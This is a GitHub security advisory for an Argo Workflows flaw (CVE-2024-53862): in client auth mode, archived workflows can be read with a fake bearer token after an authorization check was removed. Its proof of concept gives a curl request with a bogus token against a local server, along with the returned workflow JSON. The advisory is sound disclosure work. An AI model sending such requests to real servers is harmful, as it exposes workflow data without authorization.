# [M] Access to Archived Argo Workflows with Fake Token in `client` mode

## Summary
Severity: Medium
Advisory: GHSA-h36c-m3rf-34h9
CVE: CVE-2024-53862
CWE: CWE-200
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N (CVSS_V4)
Published: 2024-12-02
Source: https://github.com/advisories/GHSA-h36c-m3rf-34h9
Type: github-advisory

## Affected
- Go: `github.com/argoproj/argo-workflows/v3` — affected >=3.5.7 <3.5.13
- Go: `github.com/argoproj/argo-workflows/v3` — affected >=3.6.0 <3.6.2

## Details
### Summary

When using `--auth-mode=client`, Archived Workflows can be retrieved with a fake or spoofed token via the GET Workflow endpoint: `/api/v1/workflows/{namespace}/{name}`

When using `--auth-mode=sso`,  all Archived Workflows can be retrieved with a valid token via the GET Workflow endpoint: `/api/v1/workflows/{namespace}/{name}`

### Details

No authentication is performed by the Server itself on `client` tokens[^1]. Authentication & authorization is instead delegated to the k8s API server.
However, the [Workflow Archive](https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/workflowarchive/archived_workflow_server.go) does not interact with k8s, and so any token that [_looks_](https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/auth/mode.go#L37) [valid](https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/auth/gatekeeper.go#L185) will be considered authenticated, even if it is not a k8s token or even if the token has no RBAC for Argo. To handle the lack of pass-through k8s authN/authZ, the Workflow Archive specifically does [the equivalent of a `kubectl auth can-i`](https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/workflowarchive/archived_workflow_server.go#L50) check for respective methods.

In #12736 / v3.5.7 and #13021 / v3.5.8, the auth check was accidentally removed on the GET Workflow endpoint's fallback to archived workflows on [these lines](https://github.com/argoproj/argo-workflows/pull/13021/files#diff-a5b255abaceddc9cc20bf6da6ae92c3a5d3605d94366af503ed754c079a1171aL668-R715), allowing archived workflows to be retrieved with a fake token.

### PoC

#### Configuration

Controller `ConfigMap`:
```yaml
  config: |
    persistence:
      archive: true
      postgresql:
        database: argoworkflows
        host: db-host
        passwordSecret:
          key: postgresPassword
          name: argo-wf-postgres-credentials
        port: 5432
        tableName: argo_workflows
        userNameSecret:
          key: username
          name: argo-wf-postgres-credentials
```

Server: `--auth-mode=client`

#### Reproduction

Visit a completed, archived workflow URL with an invalid authorization token, this results in the workflow being displayed.

For example, directly query the API and retrieve the workflow data (where `Bearer thisisatest` is not a valid token):

```sh
curl -H 'Authorization: Bearer thisisatest' -v http://localhost:8000/api/v1/workflows/argo/hello-world-7tv5g
```

<details><summary>Results in a returned workflow:</summary>

```
* Host localhost:8000 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:8000...
* Connected to localhost (::1) port 8000
> GET /api/v1/workflows/argo/hello-world-7tv5g HTTP/1.1
> Host: localhost:8000
> User-Agent: curl/8.7.1
> Accept: */*
> Authorization: Bearer thisisatest
>
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: application/json
< Grpc-Metadata-Content-Type: application/grpc
< X-Ratelimit-Limit: 1000
< X-Ratelimit-Remaining: 999
< X-Ratelimit-Reset: Mon, 19 Aug 2024 20:44:27 UTC
< Date: Mon, 19 Aug 2024 20:44:26 GMT
< Transfer-Encoding: chunked
<
* Connection #0 to host localhost left intact
{
    "metadata": {
        "name": "hello-world-7tv5g",
        "generateName": "hello-world-",
        "namespace": "argo",
        "uid": "e5868ab1-f820-4a9e-9407-162346a4ccb4",
        "resourceVersion": "9982",
        "generation": 3,
        "creationTimestamp": "2024-08-13T23:59:20Z",
        "labels": {
            "workflows.argoproj.io/archive-strategy": "false",
            "workflows.argoproj.io/completed": "true",
            "workflows.argoproj.io/phase": "Succeeded",
            "workflows.argoproj.io/workflow-archiving-status": "Persisted"
        },
        "annotations": {
            "workflows.argoproj.io/description": "This is a simple hello world example.\n",
            "workflows.argoproj.io/pod-name-format": "v2"
        },
        "managedFields": [
            {
                "manager": "argo",
                "operation": "Update",
                "apiVersion": "argoproj.io/v1alpha1",
                "time": "2024-08-13T23:59:20Z",
                "fieldsType": "FieldsV1",
                "fieldsV1": {
                    "f:metadata": {
                        "f:annotations": {
                            ".": {},
                            "f:workflows.argoproj.io/description": {}
                        },
                        "f:generateName": {},
                        "f:labels": {
                            ".": {},
                            "f:workflows.argoproj.io/archive-strategy": {}
                        }
                    },
                    "f:spec": {}
                }
            },
            {
                "manager": "workflow-controller",
                "operation": "Update",
                "apiVersion": "argoproj.io/v1alpha1",
                "time": "2024-08-13T23:59:30Z",
                "fieldsType": "FieldsV1",
                "fieldsV1": {
                    "f:metadata": {
                        "f:annotations": {
                            "f:workflows.argoproj.io/pod-name-format": {}
                        },
                        "f:labels": {
                            "f:workflows.argoproj.io/completed": {},
                            "f:workflows.argoproj.io/phase": {},
                            "f:workflows.argoproj.io/workflow-archiving-status": {}
                        }
                    },
                    "f:status": {}
                }
            }
        ]
    },
    "spec": {
        "templates": [
            {
                "name": "hello-world",
                "inputs": {},
                "outputs": {},
                "metadata": {},
                "container": {
                    "name": "",
                    "image": "busybox",
                    "command": [
                        "echo"
                    ],
                    "args": [
                        "hello world"
                    ],
                    "resources": {}
                }
            }
        ],
        "entrypoint": "hello-world",
        "arguments": {},
        "serviceAccountName": "argo-workflow"
    },
    "status": {
        "phase": "Succeeded",
        "startedAt": "2024-08-13T23:59:20Z",
        "finishedAt": "2024-08-13T23:59:30Z",
        "progress": "1/1",
        "nodes": {
            "hello-world-7tv5g": {
                "id": "hello-world-7tv5g",
                "name": "hello-world-7tv5g",
                "displayName": "hello-world-7tv5g",
                "type": "Pod",
                "templateName": "hello-world",
                "templateScope": "local/hello-world-7tv5g",
                "phase": "Succeeded",
                "startedAt": "2024-08-13T23:59:20Z",
                "finishedAt": "2024-08-13T23:59:24Z",
                "progress": "1/1",
                "resourcesDuration": {
                    "cpu": 0,
                    "memory": 3
                },
                "outputs": {
                    "exitCode": "0"
                },
                "hostNodeName": "kind-control-plane"
            }
        },
        "conditions": [
            {
                "type": "PodRunning",
                "status": "False"
            },
            {
                "type": "Completed",
                "status": "True"
            }
        ],
        "resourcesDuration": {
            "cpu": 0,
            "memory": 3
        },
        "artifactRepositoryRef": {
            "default": true,
            "artifactRepository": {}
        },
        "artifactGCStatus": {
            "notSpecified": true
        },
        "taskResultsCompletionStatus": {
            "hello-world-7tv5g": true
        }
    }
}%
```

</details>


### Impact

Users of the Server with `--auth-mode=client` and with `persistence.archive: true` are vulnerable to having Archived Workflows retrieved with a fake or spoofed token.

Users of the Server with `--auth-mode=sso` and with `persistence.archive: true` are vulnerable to users being able to access workflows they could not access before archiving.

[^1]: `sso` tokens, on the other hand, are [immediately "authorized"](https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/auth/gatekeeper.go#L207). The naming in the codebase is a bit confusing; it would be more appropriate to say "authenticated" in this case, as authorization is via SSO RBAC / SA matching / k8s API server. In this same section of the codebase, the `client` tokens are not authenticated, they are only validated. Authentication and authorization is done simultaneously for `client` tokens via the k8s API server.

## References
- https://github.com/argoproj/argo-workflows/security/advisories/GHSA-h36c-m3rf-34h9
- https://nvd.nist.gov/vuln/detail/CVE-2024-53862
- https://github.com/argoproj/argo-workflows/pull/13021/files#diff-a5b255abaceddc9cc20bf6da6ae92c3a5d3605d94366af503ed754c079a1171aL668-R715
- https://github.com/argoproj/argo-workflows
